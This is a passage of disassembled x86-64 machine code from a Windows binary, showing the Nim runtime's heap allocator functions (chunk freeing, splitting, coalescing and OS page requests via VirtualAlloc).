  402298:	e8 35 f6 ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  40229d:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
  4022a2:	84 c0                	test   %al,%al
  4022a4:	74 0c                	je     4022b2 <splitChunk2__gSNzk4aToVCSTE1opfEv2A+0x66>
  4022a6:	49 8b 03             	mov    (%r11),%rax
  4022a9:	83 e0 01             	and    $0x1,%eax
  4022ac:	4c 09 d0             	or     %r10,%rax
  4022af:	49 89 03             	mov    %rax,(%r11)
  4022b2:	4d 89 41 08          	mov    %r8,0x8(%r9)
  4022b6:	49 89 d8             	mov    %rbx,%r8
  4022b9:	48 89 fa             	mov    %rdi,%rdx
  4022bc:	48 89 f1             	mov    %rsi,%rcx
  4022bf:	49 c1 f8 0c          	sar    $0xc,%r8
  4022c3:	e8 16 ff ff ff       	call   4021de <incl__tSnfTXv7GxXoDyFDm9bvzqg>
  4022c8:	48 89 d8             	mov    %rbx,%rax
  4022cb:	48 83 c4 20          	add    $0x20,%rsp
  4022cf:	5b                   	pop    %rbx
  4022d0:	5e                   	pop    %rsi
  4022d1:	5f                   	pop    %rdi
  4022d2:	c3                   	ret

00000000004022d3 <freeBigChunk__IPvsryqksLyNxxag3IQr2g>:
  4022d3:	41 54                	push   %r12
  4022d5:	55                   	push   %rbp
  4022d6:	57                   	push   %rdi
  4022d7:	56                   	push   %rsi
  4022d8:	53                   	push   %rbx
  4022d9:	48 83 ec 20          	sub    $0x20,%rsp
  4022dd:	48 8b 42 08          	mov    0x8(%rdx),%rax
  4022e1:	48 01 81 90 28 00 00 	add    %rax,0x2890(%rcx)
  4022e8:	48 8b 02             	mov    (%rdx),%rax
  4022eb:	48 8d a9 a8 28 00 00 	lea    0x28a8(%rcx),%rbp
  4022f2:	48 89 ce             	mov    %rcx,%rsi
  4022f5:	48 89 d3             	mov    %rdx,%rbx
  4022f8:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
  4022fc:	48 89 02             	mov    %rax,(%rdx)
  4022ff:	0f 84 80 00 00 00    	je     402385 <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0xb2>
  402305:	48 89 d7             	mov    %rdx,%rdi
  402308:	48 89 e9             	mov    %rbp,%rcx
  40230b:	48 29 c7             	sub    %rax,%rdi
  40230e:	48 89 fa             	mov    %rdi,%rdx
  402311:	48 c1 fa 0c          	sar    $0xc,%rdx
  402315:	e8 b8 f5 ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  40231a:	84 c0                	test   %al,%al
  40231c:	74 67                	je     402385 <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0xb2>
  40231e:	f6 07 01             	testb  $0x1,(%rdi)
  402321:	75 62                	jne    402385 <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0xb2>
  402323:	48 8b 47 08          	mov    0x8(%rdi),%rax
  402327:	48 3d c8 0f 00 00    	cmp    $0xfc8,%rax
  40232d:	7e 56                	jle    402385 <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0xb2>
  40232f:	48 3d ff ff ff 3e    	cmp    $0x3effffff,%rax
  402335:	7f 4e                	jg     402385 <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0xb2>
  402337:	48 89 fa             	mov    %rdi,%rdx
  40233a:	48 89 f1             	mov    %rsi,%rcx
  40233d:	e8 2c f8 ff ff       	call   401b6e <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2>
  402342:	48 8b 43 08          	mov    0x8(%rbx),%rax
  402346:	48 c1 fb 0c          	sar    $0xc,%rbx
  40234a:	48 89 e9             	mov    %rbp,%rcx
  40234d:	48 01 47 08          	add    %rax,0x8(%rdi)
  402351:	48 89 da             	mov    %rbx,%rdx
  402354:	48 89 fb             	mov    %rdi,%rbx
  402357:	e8 3b f5 ff ff       	call   401897 <excl__9cAWqpgI1NbhhZ3cVPHhI5A>
  40235c:	48 81 7f 08 00 00 00 	cmpq   $0x3f000000,0x8(%rdi)
  402363:	3f 
  402364:	7e 1f                	jle    402385 <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0xb2>
  402366:	48 89 fa             	mov    %rdi,%rdx
  402369:	48 89 f1             	mov    %rsi,%rcx
  40236c:	41 b8 00 00 00 3f    	mov    $0x3f000000,%r8d
  402372:	e8 d5 fe ff ff       	call   40224c <splitChunk2__gSNzk4aToVCSTE1opfEv2A>
  402377:	48 89 fa             	mov    %rdi,%rdx
  40237a:	48 89 f1             	mov    %rsi,%rcx
  40237d:	48 89 c3             	mov    %rax,%rbx
  402380:	e8 9c f8 ff ff       	call   401c21 <addChunkToMatrix__YSJZJgeU5UU2aa8GNvs3WA>
  402385:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
  402389:	48 89 e9             	mov    %rbp,%rcx
  40238c:	4a 8d 3c 0b          	lea    (%rbx,%r9,1),%rdi
  402390:	49 89 fc             	mov    %rdi,%r12
  402393:	49 c1 fc 0c          	sar    $0xc,%r12
  402397:	4c 89 e2             	mov    %r12,%rdx
  40239a:	e8 33 f5 ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  40239f:	84 c0                	test   %al,%al
  4023a1:	74 5c                	je     4023ff <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0x12c>
  4023a3:	f6 07 01             	testb  $0x1,(%rdi)
  4023a6:	75 57                	jne    4023ff <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0x12c>
  4023a8:	48 81 7f 08 c8 0f 00 	cmpq   $0xfc8,0x8(%rdi)
  4023af:	00 
  4023b0:	7e 4d                	jle    4023ff <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0x12c>
  4023b2:	49 81 f9 ff ff ff 3e 	cmp    $0x3effffff,%r9
  4023b9:	7f 44                	jg     4023ff <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0x12c>
  4023bb:	48 89 fa             	mov    %rdi,%rdx
  4023be:	48 89 f1             	mov    %rsi,%rcx
  4023c1:	e8 a8 f7 ff ff       	call   401b6e <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2>
  4023c6:	48 8b 47 08          	mov    0x8(%rdi),%rax
  4023ca:	4c 89 e2             	mov    %r12,%rdx
  4023cd:	48 89 e9             	mov    %rbp,%rcx
  4023d0:	48 01 43 08          	add    %rax,0x8(%rbx)
  4023d4:	e8 be f4 ff ff       	call   401897 <excl__9cAWqpgI1NbhhZ3cVPHhI5A>
  4023d9:	48 81 7b 08 00 00 00 	cmpq   $0x3f000000,0x8(%rbx)
  4023e0:	3f 
  4023e1:	7e 1c                	jle    4023ff <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0x12c>
  4023e3:	48 89 da             	mov    %rbx,%rdx
  4023e6:	48 89 f1             	mov    %rsi,%rcx
  4023e9:	41 b8 00 00 00 3f    	mov    $0x3f000000,%r8d
  4023ef:	e8 58 fe ff ff       	call   40224c <splitChunk2__gSNzk4aToVCSTE1opfEv2A>
  4023f4:	48 89 f1             	mov    %rsi,%rcx
  4023f7:	48 89 c2             	mov    %rax,%rdx
  4023fa:	e8 22 f8 ff ff       	call   401c21 <addChunkToMatrix__YSJZJgeU5UU2aa8GNvs3WA>
  4023ff:	48 89 da             	mov    %rbx,%rdx
  402402:	48 89 f1             	mov    %rsi,%rcx
  402405:	48 83 c4 20          	add    $0x20,%rsp
  402409:	5b                   	pop    %rbx
  40240a:	5e                   	pop    %rsi
  40240b:	5f                   	pop    %rdi
  40240c:	5d                   	pop    %rbp
  40240d:	41 5c                	pop    %r12
  40240f:	e9 0d f8 ff ff       	jmp    401c21 <addChunkToMatrix__YSJZJgeU5UU2aa8GNvs3WA>

0000000000402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>:
  402414:	48 83 ec 28          	sub    $0x28,%rsp
  402418:	49 89 d2             	mov    %rdx,%r10
  40241b:	49 89 cb             	mov    %rcx,%r11
  40241e:	48 8b 89 98 28 00 00 	mov    0x2898(%rcx),%rcx
  402425:	49 81 e2 00 f0 ff ff 	and    $0xfffffffffffff000,%r10
  40242c:	49 8b 42 08          	mov    0x8(%r10),%rax
  402430:	48 29 c1             	sub    %rax,%rcx
  402433:	48 3d c8 0f 00 00    	cmp    $0xfc8,%rax
  402439:	49 89 8b 98 28 00 00 	mov    %rcx,0x2898(%r11)
  402440:	7e 4f                	jle    402491 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x7d>
  402442:	49 83 bb d8 30 00 00 	cmpq   $0x0,0x30d8(%r11)
  402449:	00 
  40244a:	49 8d 83 d8 30 00 00 	lea    0x30d8(%r11),%rax
  402451:	75 0e                	jne    402461 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x4d>
  402453:	49 89 83 d8 30 00 00 	mov    %rax,0x30d8(%r11)
  40245a:	49 89 83 e0 30 00 00 	mov    %rax,0x30e0(%r11)
  402461:	49 89 83 b0 30 00 00 	mov    %rax,0x30b0(%r11)
  402468:	49 8d 93 a8 30 00 00 	lea    0x30a8(%r11),%rdx
  40246f:	4c 89 d9             	mov    %r11,%rcx
  402472:	4d 8d 42 20          	lea    0x20(%r10),%r8
  402476:	e8 d9 f2 ff ff       	call   401754 <del__Io5JDKCS5u26IEWw0J53hQ>
  40247b:	4d 8b 4a 08          	mov    0x8(%r10),%r9
  40247f:	49 81 f9 00 00 00 3f 	cmp    $0x3f000000,%r9
  402486:	0f 8e bd 00 00 00    	jle    402549 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x135>
  40248c:	e9 c7 00 00 00       	jmp    402558 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x144>
  402491:	49 8b 4a 20          	mov    0x20(%r10),%rcx
  402495:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)
  40249c:	00 
  40249d:	48 89 0a             	mov    %rcx,(%rdx)
  4024a0:	49 89 52 20          	mov    %rdx,0x20(%r10)
  4024a4:	49 8b 52 28          	mov    0x28(%r10),%rdx
  4024a8:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
  4024ac:	48 39 c2             	cmp    %rax,%rdx
  4024af:	7c 13                	jl     4024c4 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0xb0>
  4024b1:	48 81 f9 c8 0f 00 00 	cmp    $0xfc8,%rcx
  4024b8:	49 89 4a 28          	mov    %rcx,0x28(%r10)
  4024bc:	0f 85 df 00 00 00    	jne    4025a1 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x18d>
  4024c2:	eb 2d                	jmp    4024f1 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0xdd>
  4024c4:	48 99                	cqto
  4024c6:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  4024cc:	49 f7 f8             	idiv   %r8
  4024cf:	49 8d 14 c3          	lea    (%r11,%rax,8),%rdx
  4024d3:	48 8b 42 10          	mov    0x10(%rdx),%rax
  4024d7:	48 85 c0             	test   %rax,%rax
  4024da:	49 89 42 10          	mov    %rax,0x10(%r10)
  4024de:	74 04                	je     4024e4 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0xd0>
  4024e0:	4c 89 50 18          	mov    %r10,0x18(%rax)
  4024e4:	4c 89 52 10          	mov    %r10,0x10(%rdx)
  4024e8:	49 89 4a 28          	mov    %rcx,0x28(%r10)
  4024ec:	e9 b0 00 00 00       	jmp    4025a1 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x18d>
  4024f1:	48 99                	cqto
  4024f3:	b9 08 00 00 00       	mov    $0x8,%ecx
  4024f8:	48 f7 f9             	idiv   %rcx
  4024fb:	49 8d 14 c3          	lea    (%r11,%rax,8),%rdx
  4024ff:	49 8b 42 10          	mov    0x10(%r10),%rax
  402503:	4c 3b 52 10          	cmp    0x10(%rdx),%r10
  402507:	74 17                	je     402520 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x10c>
  402509:	49 8b 52 18          	mov    0x18(%r10),%rdx
  40250d:	48 89 42 10          	mov    %rax,0x10(%rdx)
  402511:	49 8b 42 10          	mov    0x10(%r10),%rax
  402515:	48 85 c0             	test   %rax,%rax
  402518:	74 17                	je     402531 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x11d>
  40251a:	48 89 50 18          	mov    %rdx,0x18(%rax)
  40251e:	eb 11                	jmp    402531 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x11d>
  402520:	48 85 c0             	test   %rax,%rax
  402523:	48 89 42 10          	mov    %rax,0x10(%rdx)
  402527:	74 08                	je     402531 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x11d>
  402529:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
  402530:	00 
  402531:	49 c7 42 10 00 00 00 	movq   $0x0,0x10(%r10)
  402538:	00 
  402539:	49 c7 42 18 00 00 00 	movq   $0x0,0x18(%r10)
  402540:	00 
  402541:	49 c7 42 08 00 10 00 	movq   $0x1000,0x8(%r10)
  402548:	00 
  402549:	4c 89 d2             	mov    %r10,%rdx
  40254c:	4c 89 d9             	mov    %r11,%rcx
  40254f:	48 83 c4 28          	add    $0x28,%rsp
  402553:	e9 7b fd ff ff       	jmp    4022d3 <freeBigChunk__IPvsryqksLyNxxag3IQr2g>
  402558:	49 8d 8b a8 28 00 00 	lea    0x28a8(%r11),%rcx
  40255f:	4c 89 d2             	mov    %r10,%rdx
  402562:	48 c1 fa 0c          	sar    $0xc,%rdx
  402566:	e8 2c f3 ff ff       	call   401897 <excl__9cAWqpgI1NbhhZ3cVPHhI5A>
  40256b:	49 8b 83 80 28 00 00 	mov    0x2880(%r11),%rax
  402572:	4c 89 d1             	mov    %r10,%rcx
  402575:	49 39 83 88 28 00 00 	cmp    %rax,0x2888(%r11)
  40257c:	48 89 c2             	mov    %rax,%rdx
  40257f:	49 0f 4d 93 88 28 00 	cmovge 0x2888(%r11),%rdx
  402586:	00 
  402587:	4c 29 c8             	sub    %r9,%rax
  40258a:	49 89 83 80 28 00 00 	mov    %rax,0x2880(%r11)
  402591:	49 89 93 88 28 00 00 	mov    %rdx,0x2888(%r11)
  402598:	48 83 c4 28          	add    $0x28,%rsp
  40259c:	e9 04 f8 ff ff       	jmp    401da5 <osDeallocPages__dRMEutPSAkbR9b9blNmTzvoQsystem.isra.6>
  4025a1:	48 83 c4 28          	add    $0x28,%rsp
  4025a5:	c3                   	ret

00000000004025a6 <deallocImpl__lmwgHsdhTsrQaepFju8wew>:
  4025a6:	53                   	push   %rbx
  4025a7:	48 83 ec 20          	sub    $0x20,%rsp
  4025ab:	48 89 cb             	mov    %rcx,%rbx
  4025ae:	e8 ed f6 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  4025b3:	48 8d 53 f0          	lea    -0x10(%rbx),%rdx
  4025b7:	48 8d 88 a0 00 00 00 	lea    0xa0(%rax),%rcx
  4025be:	48 83 c4 20          	add    $0x20,%rsp
  4025c2:	5b                   	pop    %rbx
  4025c3:	e9 4c fe ff ff       	jmp    402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>

00000000004025c8 <splitChunk__BqFVAuadgXfvAiq8B9cBjqQ>:
  4025c8:	53                   	push   %rbx
  4025c9:	48 83 ec 20          	sub    $0x20,%rsp
  4025cd:	48 89 cb             	mov    %rcx,%rbx
  4025d0:	e8 77 fc ff ff       	call   40224c <splitChunk2__gSNzk4aToVCSTE1opfEv2A>
  4025d5:	48 89 d9             	mov    %rbx,%rcx
  4025d8:	48 89 c2             	mov    %rax,%rdx
  4025db:	48 83 c4 20          	add    $0x20,%rsp
  4025df:	5b                   	pop    %rbx
  4025e0:	e9 3c f6 ff ff       	jmp    401c21 <addChunkToMatrix__YSJZJgeU5UU2aa8GNvs3WA>

00000000004025e5 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2>:
  4025e5:	57                   	push   %rdi
  4025e6:	56                   	push   %rsi
  4025e7:	53                   	push   %rbx
  4025e8:	48 83 ec 20          	sub    $0x20,%rsp
  4025ec:	80 b9 c9 30 00 00 00 	cmpb   $0x0,0x30c9(%rcx)
  4025f3:	48 89 cb             	mov    %rcx,%rbx
  4025f6:	48 89 d7             	mov    %rdx,%rdi
  4025f9:	75 54                	jne    40264f <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x6a>
  4025fb:	48 8b 81 98 28 00 00 	mov    0x2898(%rcx),%rax
  402602:	48 3d ff ff 00 00    	cmp    $0xffff,%rax
  402608:	7e 3a                	jle    402644 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x5f>
  40260a:	48 8b 91 d0 30 00 00 	mov    0x30d0(%rcx),%rdx
  402611:	48 c1 f8 02          	sar    $0x2,%rax
  402615:	b9 00 00 00 3f       	mov    $0x3f000000,%ecx
  40261a:	48 05 ff 0f 00 00    	add    $0xfff,%rax
  402620:	48 25 00 f0 ff ff    	and    $0xfffffffffffff000,%rax
  402626:	48 01 d2             	add    %rdx,%rdx
  402629:	48 81 fa 00 00 00 3f 	cmp    $0x3f000000,%rdx
  402630:	48 0f 4f d1          	cmovg  %rcx,%rdx
  402634:	48 39 d0             	cmp    %rdx,%rax
  402637:	48 0f 4f c2          	cmovg  %rdx,%rax
  40263b:	48 89 83 d0 30 00 00 	mov    %rax,0x30d0(%rbx)
  402642:	eb 0b                	jmp    40264f <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x6a>
  402644:	48 c7 81 d0 30 00 00 	movq   $0x4000,0x30d0(%rcx)
  40264b:	00 40 00 00 
  40264f:	48 8b 93 d0 30 00 00 	mov    0x30d0(%rbx),%rdx
  402656:	48 39 fa             	cmp    %rdi,%rdx
  402659:	7c 25                	jl     402680 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x9b>
  40265b:	31 c9                	xor    %ecx,%ecx
  40265d:	41 b9 04 00 00 00    	mov    $0x4,%r9d
  402663:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
  402669:	ff 15 cd 5c 04 00    	call   *0x45ccd(%rip)        # 44833c <__imp_VirtualAlloc>
  40266f:	48 85 c0             	test   %rax,%rax
  402672:	48 89 c6             	mov    %rax,%rsi
  402675:	74 16                	je     40268d <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0xa8>
  402677:	48 8b bb d0 30 00 00 	mov    0x30d0(%rbx),%rdi
  40267e:	eb 1f                	jmp    40269f <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0xba>
  402680:	48 89 f9             	mov    %rdi,%rcx
  402683:	e8 fa f9 ff ff       	call   402082 <osAllocPages__HMOhWrY1QMa49a2BcJwSDZQsystem>
  402688:	48 89 c6             	mov    %rax,%rsi
  40268b:	eb 12                	jmp    40269f <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0xba>
  40268d:	48 89 f9             	mov    %rdi,%rcx
  402690:	e8 ed f9 ff ff       	call   402082 <osAllocPages__HMOhWrY1QMa49a2BcJwSDZQsystem>
  402695:	c6 83 c9 30 00 00 01 	movb   $0x1,0x30c9(%rbx)
  40269c:	48 89 c6             	mov    %rax,%rsi
  40269f:	48 01 bb 80 28 00 00 	add    %rdi,0x2880(%rbx)
  4026a6:	48 8d 83 00 31 00 00 	lea    0x3100(%rbx),%rax
  4026ad:	48 01 bb 90 28 00 00 	add    %rdi,0x2890(%rbx)
  4026b4:	48 83 38 1d          	cmpq   $0x1d,(%rax)
  4026b8:	0f 8e b7 00 00 00    	jle    402775 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x190>
  4026be:	48 8b 80 e8 01 00 00 	mov    0x1e8(%rax),%rax
  4026c5:	48 85 c0             	test   %rax,%rax
  4026c8:	75 ea                	jne    4026b4 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0xcf>
  4026ca:	ba f0 01 00 00       	mov    $0x1f0,%edx
  4026cf:	48 89 d9             	mov    %rbx,%rcx
  4026d2:	e8 d5 f9 ff ff       	call   4020ac <llAlloc__ovw3NMWXeZ0Qi9cGYq1E2Tg>
  4026d7:	48 8b 93 e8 32 00 00 	mov    0x32e8(%rbx),%rdx
  4026de:	48 89 90 e8 01 00 00 	mov    %rdx,0x1e8(%rax)
  4026e5:	48 89 83 e8 32 00 00 	mov    %rax,0x32e8(%rbx)
  4026ec:	48 89 70 08          	mov    %rsi,0x8(%rax)
  4026f0:	48 89 78 10          	mov    %rdi,0x10(%rax)
  4026f4:	48 c7 00 01 00 00 00 	movq   $0x1,(%rax)
  4026fb:	4c 8d 0c 37          	lea    (%rdi,%rsi,1),%r9
  4026ff:	48 c7 46 10 00 00 00 	movq   $0x0,0x10(%rsi)
  402706:	00 
  402707:	4c 8d 9b a8 28 00 00 	lea    0x28a8(%rbx),%r11
  40270e:	4c 89 ca             	mov    %r9,%rdx
  402711:	48 c7 46 18 00 00 00 	movq   $0x0,0x18(%rsi)
  402718:	00 
  402719:	48 c1 fa 0c          	sar    $0xc,%rdx
  40271d:	48 89 7e 08          	mov    %rdi,0x8(%rsi)
  402721:	4c 89 d9             	mov    %r11,%rcx
  402724:	e8 a9 f1 ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  402729:	84 c0                	test   %al,%al
  40272b:	74 0c                	je     402739 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x154>
  40272d:	49 8b 01             	mov    (%r9),%rax
  402730:	83 e0 01             	and    $0x1,%eax
  402733:	48 09 f8             	or     %rdi,%rax
  402736:	49 89 01             	mov    %rax,(%r9)
  402739:	4c 8b 8b a0 28 00 00 	mov    0x28a0(%rbx),%r9
  402740:	4d 85 c9             	test   %r9,%r9
  402743:	75 06                	jne    40274b <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x166>
  402745:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
  40274b:	49 89 f2             	mov    %rsi,%r10
  40274e:	4c 89 d9             	mov    %r11,%rcx
  402751:	4d 29 ca             	sub    %r9,%r10
  402754:	4c 89 d2             	mov    %r10,%rdx
  402757:	48 c1 fa 0c          	sar    $0xc,%rdx
  40275b:	e8 72 f1 ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  402760:	48 8b 16             	mov    (%rsi),%rdx
  402763:	83 e2 01             	and    $0x1,%edx
  402766:	84 c0                	test   %al,%al
  402768:	74 2b                	je     402795 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x1b0>
  40276a:	4d 39 4a 08          	cmp    %r9,0x8(%r10)
  40276e:	75 25                	jne    402795 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x1b0>
  402770:	4c 09 ca             	or     %r9,%rdx
  402773:	eb 20                	jmp    402795 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x1b0>
  402775:	48 8b 10             	mov    (%rax),%rdx
  402778:	48 89 d1             	mov    %rdx,%rcx
  40277b:	48 ff c2             	inc    %rdx
  40277e:	48 c1 e1 04          	shl    $0x4,%rcx
  402782:	48 01 c1             	add    %rax,%rcx
  402785:	48 89 71 08          	mov    %rsi,0x8(%rcx)
  402789:	48 89 79 10          	mov    %rdi,0x10(%rcx)
  40278d:	48 89 10             	mov    %rdx,(%rax)
  402790:	e9 66 ff ff ff       	jmp    4026fb <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x116>
  402795:	48 89 f0             	mov    %rsi,%rax
  402798:	48 89 16             	mov    %rdx,(%rsi)
  40279b:	48 89 bb a0 28 00 00 	mov    %rdi,0x28a0(%rbx)
  4027a2:	48 83 c4 20          	add    $0x20,%rsp
  4027a6:	5b                   	pop    %rbx
  4027a7:	5e                   	pop    %rsi
  4027a8:	5f                   	pop    %rdi
  4027a9:	c3                   	ret

00000000004027aa <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ>:
  4027aa:	57                   	push   %rdi
  4027ab:	56                   	push   %rsi
  4027ac:	53                   	push   %rbx
  4027ad:	48 83 ec 20          	sub    $0x20,%rsp
  4027b1:	bf 00 00 00 3f       	mov    $0x3f000000,%edi
  4027b6:	48 89 cb             	mov    %rcx,%rbx
  4027b9:	89 d1                	mov    %edx,%ecx
  4027bb:	49 89 d0             	mov    %rdx,%r8
  4027be:	e8 48 f1 ff ff       	call   40190b <msbit__NR8XkKls428clCUr82szCgsystem>
  4027c3:	8d 48 fb             	lea    -0x5(%rax),%ecx
  4027c6:	b8 01 00 00 00       	mov    $0x1,%eax
  4027cb:	48 d3 e0             	shl    %cl,%rax
  4027ce:	48 05 ff 0f 00 00    	add    $0xfff,%rax
  4027d4:	48 25 00 f0 ff ff    	and    $0xfffffffffffff000,%rax
  4027da:	4e 8d 4c 00 ff       	lea    -0x1(%rax,%r8,1),%r9
  4027df:	48 f7 d8             	neg    %rax
  4027e2:	49 21 c1             	and    %rax,%r9
  4027e5:	49 81 f9 00 00 00 3f 	cmp    $0x3f000000,%r9
  4027ec:	49 0f 4e f9          	cmovle %r9,%rdi
  4027f0:	89 f9                	mov    %edi,%ecx
  4027f2:	48 89 fe             	mov    %rdi,%rsi
  4027f5:	e8 11 f1 ff ff       	call   40190b <msbit__NR8XkKls428clCUr82szCgsystem>
  4027fa:	ba ff ff ff ff       	mov    $0xffffffff,%edx
  4027ff:	8d 48 fb             	lea    -0x5(%rax),%ecx
  402802:	4c 8d 40 fa          	lea    -0x6(%rax),%r8
  402806:	48 d3 fe             	sar    %cl,%rsi
  402809:	48 89 f1             	mov    %rsi,%rcx
  40280c:	48 89 d6             	mov    %rdx,%rsi
  40280f:	48 83 e9 20          	sub    $0x20,%rcx
  402813:	48 d3 e6             	shl    %cl,%rsi
  402816:	48 89 f1             	mov    %rsi,%rcx
  402819:	23 8c 83 fc 0f 00 00 	and    0xffc(%rbx,%rax,4),%ecx
  402820:	75 31                	jne    402853 <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0xa9>
  402822:	41 8d 48 01          	lea    0x1(%r8),%ecx
  402826:	48 d3 e2             	shl    %cl,%rdx
  402829:	23 93 10 10 00 00    	and    0x1010(%rbx),%edx
  40282f:	89 d1                	mov    %edx,%ecx
  402831:	f7 d9                	neg    %ecx
  402833:	21 d1                	and    %edx,%ecx
  402835:	e8 d1 f0 ff ff       	call   40190b <msbit__NR8XkKls428clCUr82szCgsystem>
  40283a:	48 85 c0             	test   %rax,%rax
  40283d:	49 89 c0             	mov    %rax,%r8
  402840:	0f 8e b5 00 00 00    	jle    4028fb <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x151>
  402846:	8b 84 83 14 10 00 00 	mov    0x1014(%rbx,%rax,4),%eax
  40284d:	89 c1                	mov    %eax,%ecx
  40284f:	f7 d9                	neg    %ecx
  402851:	eb 04                	jmp    402857 <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0xad>
  402853:	89 c8                	mov    %ecx,%eax
  402855:	f7 d8                	neg    %eax
  402857:	21 c1                	and    %eax,%ecx
  402859:	e8 ad f0 ff ff       	call   40190b <msbit__NR8XkKls428clCUr82szCgsystem>
  40285e:	4c 89 c2             	mov    %r8,%rdx
  402861:	48 c1 e2 05          	shl    $0x5,%rdx
  402865:	48 8d 94 10 0e 02 00 	lea    0x20e(%rax,%rdx,1),%rdx
  40286c:	00 
  40286d:	48 8b 74 d3 08       	mov    0x8(%rbx,%rdx,8),%rsi
  402872:	48 85 f6             	test   %rsi,%rsi
  402875:	0f 84 80 00 00 00    	je     4028fb <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x151>
  40287b:	48 8b 56 10          	mov    0x10(%rsi),%rdx
  40287f:	4c 89 c1             	mov    %r8,%rcx
  402882:	48 c1 e1 05          	shl    $0x5,%rcx
  402886:	48 8d 8c 08 0e 02 00 	lea    0x20e(%rax,%rcx,1),%rcx
  40288d:	00 
  40288e:	48 85 d2             	test   %rdx,%rdx
  402891:	48 89 54 cb 08       	mov    %rdx,0x8(%rbx,%rcx,8)
  402896:	75 3c                	jne    4028d4 <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x12a>
  402898:	4e 8d 0c 83          	lea    (%rbx,%r8,4),%r9
  40289c:	83 e0 1f             	and    $0x1f,%eax
  40289f:	ba 01 00 00 00       	mov    $0x1,%edx
  4028a4:	89 c1                	mov    %eax,%ecx
  4028a6:	49 89 d2             	mov    %rdx,%r10
  4028a9:	49 d3 e2             	shl    %cl,%r10
  4028ac:	4c 89 d0             	mov    %r10,%rax
  4028af:	f7 d0                	not    %eax
  4028b1:	41 23 81 14 10 00 00 	and    0x1014(%r9),%eax
  4028b8:	41 89 81 14 10 00 00 	mov    %eax,0x1014(%r9)
  4028bf:	75 1b                	jne    4028dc <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x132>
  4028c1:	44 89 c1             	mov    %r8d,%ecx
  4028c4:	83 e1 1f             	and    $0x1f,%ecx
  4028c7:	48 d3 e2             	shl    %cl,%rdx
  4028ca:	f7 d2                	not    %edx
  4028cc:	21 93 10 10 00 00    	and    %edx,0x1010(%rbx)
  4028d2:	eb 08                	jmp    4028dc <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x132>
  4028d4:	48 c7 42 18 00 00 00 	movq   $0x0,0x18(%rdx)
  4028db:	00 
  4028dc:	48 8d 87 ff 0f 00 00 	lea    0xfff(%rdi),%rax
  4028e3:	48 3b 46 08          	cmp    0x8(%rsi),%rax
  4028e7:	48 c7 46 18 00 00 00 	movq   $0x0,0x18(%rsi)
  4028ee:	00 
  4028ef:	48 c7 46 10 00 00 00 	movq   $0x0,0x10(%rsi)
